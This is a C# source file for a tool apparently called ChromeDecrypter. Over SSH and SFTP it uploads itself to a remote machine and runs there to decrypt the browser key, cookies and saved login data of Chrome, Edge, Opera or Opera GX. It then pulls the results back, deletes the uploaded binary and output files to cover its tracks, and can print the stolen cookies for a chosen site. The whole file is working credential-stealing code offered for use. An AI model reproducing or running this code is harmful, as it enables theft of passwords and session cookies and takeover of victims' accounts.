using Newtonsoft.Json;
using Renci.SshNet;
using Renci.SshNet.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace ChromeDecrypter
{
    internal class SSHExecution
    {
        static string? username, host, password;
        static string? remoteDirectory;
        static string action;
        static string browser;

        static string keyOutputFilePath = Path.Combine(Path.GetDirectoryName(Environment.ProcessPath), "Output", "BrowserKey");
        static string jsonOutputFilePath = Path.Combine(Path.GetDirectoryName(Environment.ProcessPath), "Output", "Cookies.json");
        static string jsonLoginDataOutputFilePath = Path.Combine(Path.GetDirectoryName(Environment.ProcessPath), "Output", "Login Data.json");

        public static void Init()
        {
#pragma warning disable CA1839, CS8602
            string exeFilePath = Process.GetCurrentProcess().MainModule.FileName;

            Console.Write("Enter the SSH's server username: ");
            username = Console.ReadLine();
            Console.Write($"Enter the {username}'s ip: ");
            host = Console.ReadLine();
            Console.Write($"Enter the {username}'s password: ");
            password = Console.ReadLine();
            Console.Write($"Enter the remote DIRECTORY where to store the file: ");
            remoteDirectory = Console.ReadLine();
            if (!remoteDirectory.StartsWith('/')) { remoteDirectory = "/" + remoteDirectory; }

            UploadThisFile(exeFilePath);
            Console.Clear();
            ChooseAction();
            Console.Clear();
            ChooseBrowser();

            Console.Clear();
            string remoteFilePath = Path.Combine(remoteDirectory.Substring(1), "file.exe");
            ExecuteThisFileOnRemoteServer(remoteFilePath, $"-a {action} -b {browser}");

            //string localFilePathDest = action == "DecryptKey" ? keyOutputFilePath : jsonOutputFilePath;
            List<string> localFilesPathsDests = new List<string>();
            List<string> remoteGeneratedFilesPaths = new List<string>();
            switch (action)
            {
                case "DecryptKey":
                    localFilesPathsDests.Add(keyOutputFilePath);
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "BrowserKey"));
                    break;
                case "DecryptCookies":
                    localFilesPathsDests.Add(jsonOutputFilePath);
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "Cookies.json"));
                    break;
                case "DecryptLoginData":
                    localFilesPathsDests.Add(jsonLoginDataOutputFilePath);
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "Login Data.json"));
                    break;
                case "DecryptAll":
                    localFilesPathsDests.Add(keyOutputFilePath);
                    localFilesPathsDests.Add(jsonOutputFilePath);
                    localFilesPathsDests.Add(jsonLoginDataOutputFilePath);
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "BrowserKey"));
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "Cookies.json"));
                    remoteGeneratedFilesPaths.Add(Path.Combine(remoteDirectory, "Output", "Login Data.json"));
                    break;
            }
            DownloadGeneratedFile(localFilesPathsDests, remoteGeneratedFilesPaths);

            Console.Write("Do you want to see the cookies from a specific host? Put it here or leave it empty: ");
            string? input = Console.ReadLine();
            if (!string.IsNullOrEmpty(input))
            {
                PrintRequestedCookie(jsonOutputFilePath, input);
            }
        }

        static void UploadThisFile(string exeFilePath)
        {
#pragma warning disable CS8604
            try
            {
                using (var sftp = new SftpClient(host, username, password))
                {
                    Console.WriteLine("\nConnecting via SFTP...");
                    sftp.Connect();
                    if (sftp.IsConnected)
                    {
                        Console.WriteLine("Uploading THIS file...");
                        using (Stream fs = File.OpenRead(exeFilePath))
                        {
                            sftp.ChangeDirectory(remoteDirectory);
                            sftp.UploadFile(fs, "file.exe");
                            Console.WriteLine("File uploaded successfully!");
                        }
                    }
                }
            }
            catch (Exception e) when (e is SshConnectionException || e is SocketException || e is ProxyException)
            {
                Console.WriteLine($"Error connecting to server: {e.Message}. Press any key to continue.");
            }
            catch (SshAuthenticationException e)
            {
                Console.WriteLine($"Failed to authenticate: {e.Message}. Press any key to continue.");
            }
            catch (SftpPermissionDeniedException e)
            {
                Console.WriteLine($"Operation denied by the server: {e.Message}. Press any key to continue.");
            }
            catch (SshException e)
            {
                Console.WriteLine($"Sftp Error: {e.Message}. Press any key to continue.");
            }
        }

        static void ChooseAction()
        {
            Console.WriteLine("What do you want to do in the remote server?\n");
            Console.WriteLine("[1] Decrypt Browser Key");
            Console.WriteLine("[2] Decrypt Browser Cookies");
            Console.WriteLine("[3] Decrypt Browser Login Data");
            Console.WriteLine("[4] Decrypt All\n");
            Console.Write("> ");
            string? input = Console.ReadLine();
            if (int.TryParse(input, out int result))
            {
                if (result >= 1 && result <= 4)
                {
                    switch (result)
                    {
                        case 1: action = "DecryptKey"; return;
                        case 2: action = "DecryptCookies"; return;
                        case 3: action = "DecryptLoginData"; return;
                        case 4: action = "DecryptAll"; return;
                    }
                }
            }

            Console.WriteLine("Please enter a valid option.");
            ChooseAction();
        }
        static void ChooseBrowser()
        {
            Console.WriteLine("Which browser is the target in the remote server?\n");
            Console.WriteLine("[1] Google Chrome");
            Console.WriteLine("[2] Microsoft Edge");
            Console.WriteLine("[3] Opera");
            Console.WriteLine("[4] Opera GX\n");
            Console.Write("> ");
            string? input = Console.ReadLine();
            if (int.TryParse(input, out int result))
            {
                if (result >= 1 && result <= 4)
                {
                    switch (result)
                    {
                        case 1: browser = "Chrome"; return;
                        case 2: browser = "Edge"; return;
                        case 3: browser = "Opera"; return;
                        case 4: browser = "OperaGX"; return;
                    }
                }
            }

            Console.WriteLine("Please enter a valid option.");
            ChooseBrowser();
        }

        static void ExecuteThisFileOnRemoteServer(string remoteFilePath, string parameters)
        {
            using (var client = new SshClient(host, username, password))
            {
                Console.WriteLine("Connectiong to remote server via SSH...");
                client.Connect();
                if (client.IsConnected)
                {
                    var commandStr = $"{remoteFilePath} {parameters}";
                    Console.WriteLine($"Executing file...");
                    var command = client.CreateCommand(commandStr);
                    command.EndExecute(command.BeginExecute());

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Output: {command.Result}");
                    Console.ForegroundColor = ConsoleColor.White;
                }
            }
        }

        static void DownloadGeneratedFile(List<string> localFilesPathsDests, List<string> remoteFilesPaths)
        {
#pragma warning disable CS8604
            try
            {
                using (var sftp = new SftpClient(host, username, password))
                {
                    Console.WriteLine("\nConnecting via SFTP to download the file...");
                    sftp.Connect();
                    if (sftp.IsConnected)
                    {
                        Console.WriteLine("Downloading generated file...");
                        for (int i = 0; i < localFilesPathsDests.Count; i++)
                        {
                            using (Stream fs = File.Create(localFilesPathsDests[i]))
                            {
                                sftp.DownloadFile(remoteFilesPaths[i], fs);
                                fs.Close();
                                Console.WriteLine("File downloaded successfully!");
                            }
                        }

                        Console.WriteLine("Deleting remote files...");
                        sftp.DeleteFile(Path.Combine(remoteDirectory, "file.exe"));

                        // Iterate for each file into the "output" folder and delete it.
                        var items = sftp.ListDirectory(Path.Combine(remoteDirectory, "Output"));
                        foreach (var item in items)
                        {
                            if (item.Name == "." || item.Name == "..") continue;

                            if (!item.IsDirectory) { sftp.DeleteFile(item.FullName); }
                        }
                        // Delete the empty folder.
                        sftp.DeleteDirectory(Path.Combine(remoteDirectory, "Output"));
                        Console.WriteLine("Done! Press any key to continue.");
                    }
                }
            }
            catch (Exception e) when (e is SshConnectionException || e is SocketException || e is ProxyException)
            {
                Console.WriteLine($"Error connecting to server: {e.Message}. Press any key to continue.");
            }
            catch (SshAuthenticationException e)
            {
                Console.WriteLine($"Failed to authenticate: {e.Message}. Press any key to continue.");
            }
            catch (SftpPermissionDeniedException e)
            {
                Console.WriteLine($"Operation denied by the server: {e.Message}. Press any key to continue.");
            }
            catch (SshException e)
            {
                Console.WriteLine($"Sftp Error: {e.Message}. Press any key to continue.");
            }
        }

        static void PrintRequestedCookie(string jsonOutputFile, string cookieHost)
        {
            string cookiesFileContent = File.ReadAllText(jsonOutputFilePath);
            var cookiesData = JsonConvert.DeserializeObject<Dictionary<string, List<Dictionary<string, object>>>>(cookiesFileContent); // WTF
            if (cookiesData.ContainsKey(cookieHost))
            {
                Console.Clear();
                string jsonCookiesFromHost = JsonConvert.SerializeObject(cookiesData[cookieHost], Formatting.Indented);
                Console.WriteLine(jsonCookiesFromHost);
                string hostCookiesOutputFile = Path.Combine(Path.GetDirectoryName(jsonOutputFile), "Requested Host Cookies.json");
                File.WriteAllText(hostCookiesOutputFile, jsonCookiesFromHost);
            }
            else
            {
                Console.WriteLine($"No cookies found for host: {host}.");
            }
        }
    }
}
